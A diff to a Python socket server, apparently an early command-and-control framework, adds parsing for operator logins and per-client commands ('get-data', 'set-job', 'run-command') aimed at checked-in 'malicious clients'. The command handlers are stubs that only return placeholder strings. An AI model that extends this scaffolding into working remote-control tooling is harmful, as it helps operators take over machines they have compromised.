@@ -80,6 +80,8 @@ class s_sock:
             ## interact with server, on first connection
             if self.id == "!_userlogin_!":
                 print("PassSplit") if global_debug else None
+                ##ex:
+                ## !_userlogin_!\|/username//|\\password
                 username, password = self.message.split("//|\\\\")
 
                 # Password evaluation
@@ -138,7 +140,7 @@ class s_sock:
                     ## creating object intance
                     self.client = s_perclient()
 
-                    # something dict
+                    # adding the instance self.client to the self.clients dict
                     self.clients[client_name] = self.client
                     
                     ''' THis is what the dict looks like, each "name" is pointing at a class object
@@ -148,7 +150,7 @@ class s_sock:
                         "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
                     }
                     '''
-
+                    ## adding athat dict to the global list, under the "client_name"
                     globals()[client_name] = self.client
                 
                 else:
@@ -207,8 +209,14 @@ class s_friendlyclient:
             ## Waiting on input from client, on a per thread/friedly client basis until disconnection
             ## diffeerent than malicious clients, as they are constantly checking in, this is a more
             ## consistent connection
+            
+            ## Ex Input:
+            #!_usercommand_!\|/ryan//|\\get-data client_127.0.0.1 
+            # action\|/username//|\\command
             raw_user_input = self.conn.recv(1024).decode()
-            user_input = self.parse_msg(raw_user_input)
+            user_input = self.parse_msg_for_server(raw_user_input)
+            
+            print(raw_user_input)
             
             ## For readability:
             try:
@@ -229,33 +237,73 @@ class s_friendlyclient:
 
     def server_decision_tree(self, message):
         ## Always gets clients b4 running
-        current_clientlist = ""
+        self.current_clientlist = ""
         for var_name in globals():
             if var_name.startswith("client_"):
                 ## Sanity check to turn var_name into a string just in case
-                current_clientlist += f"{var_name}\n"
+                self.current_clientlist += f"{var_name}\n"
                 
         if message == "clients":       
-            if current_clientlist != "":
-                self.send_msg(current_clientlist)
+            if self.current_clientlist != "":
+                self.send_msg(self.current_clientlist)
             else:
                 self.send_msg("No Current Clients")
-
-        elif message in current_clientlist:
-            print("!!Client Exists!!") if global_debug else None
 
         ## need to find a way to get thesub shell as well
         elif message == "stats":
             pass
             ## Need: client instance name
             ## then. client_instance.stats
-            
         
+        #else:
+            #self.send_msg(self.InputNotUnderstood)
+        
+        ## if nothing here is understood, pass to the client decision tree
+        ## I couldn't think of any other (clean) way to do it
         else:
-            self.send_msg(self.InputNotUnderstood)
+            self.client_decision_tree(message)
+            #print("!!Client Exists!!") if global_debug else None
 
-    def client_decision_tree(self, message):
-        pass
+    def client_decision_tree(self, raw_message):
+        message = self.parse_msg_for_client(raw_message)
+        print(f"RawMSG: {raw_message}")
+        print(f"Parsed Message: {message}")
+        
+
+        client_command = message [0]
+        client_name = message[1]
+        
+        ## setting self.client to the client name passed by the fclient
+        self.client = globals()[client_name]
+        
+        #print(self.client)
+        #print(self.client.stats_heartbeats)
+        #globals()[client_name] = self.client
+        
+        #if client exists check FIRST!
+        if client_name in self.current_clientlist:
+            pass
+        else:
+            print("Client not found... ")
+            ##exit protocol
+            #self.exit_protocol()
+        
+        if client_command == "get-data":
+            data = f"{self.client.data_list}"
+            self.send_msg(data)
+            
+        elif client_command == "set-job":
+            #self.client.
+            
+            data = "setjob"
+            self.send_msg(data)
+
+        elif client_command == "run-command":
+            data = "runcommand"
+            self.send_msg(data)
+        
+        #else:
+            #self.send_msg(self.InputNotUnderstood)
 
     def send_msg(self, message:str):
         try:
@@ -269,7 +317,7 @@ class s_friendlyclient:
             #pass
             
     
-    def parse_msg(self, raw_message) -> list:
+    def parse_msg_for_server(self, raw_message) -> list:
         print(f"Raw Message: {raw_message}")  if global_debug else None
         
         ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
@@ -278,6 +326,19 @@ class s_friendlyclient:
         print(f"Parsed Message: {parsed_results_list}") if global_debug else None
         
         return parsed_results_list
+    
+    def parse_msg_for_client(self, raw_message) -> list:
+        print(f"Raw Message: {raw_message}")  if global_debug else None
+        
+        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
+        parsed_results_list = raw_message.split()
+        
+        print(f"Parsed Message: {parsed_results_list}") if global_debug else None
+        return parsed_results_list
+
+    ## meant for closing the connection
+    def exit_protocol(self):
+        self.conn.close()
 
 
 #################################
@@ -295,6 +356,8 @@ class s_perclient:
         self.stats_heartbeat_timer = 15
         self.stats_jobsrun = 0
         self.stats_latestcheckin = 0
+        ## all the data in one spot
+
     
     def handle_client(self, conn, addr, message, id):
         
@@ -303,6 +366,13 @@ class s_perclient:
         self.ip = addr[0]
         self.port = addr[1]
         self.id =  id
+        
+        self.data_list = [
+            self.stats_heartbeats,
+            self.stats_heartbeat_timer,
+            self.stats_jobsrun,
+            self.stats_latestcheckin
+        ]
         
         ## Sending message back to client that connection is ok
         #self.send_msg("ok")
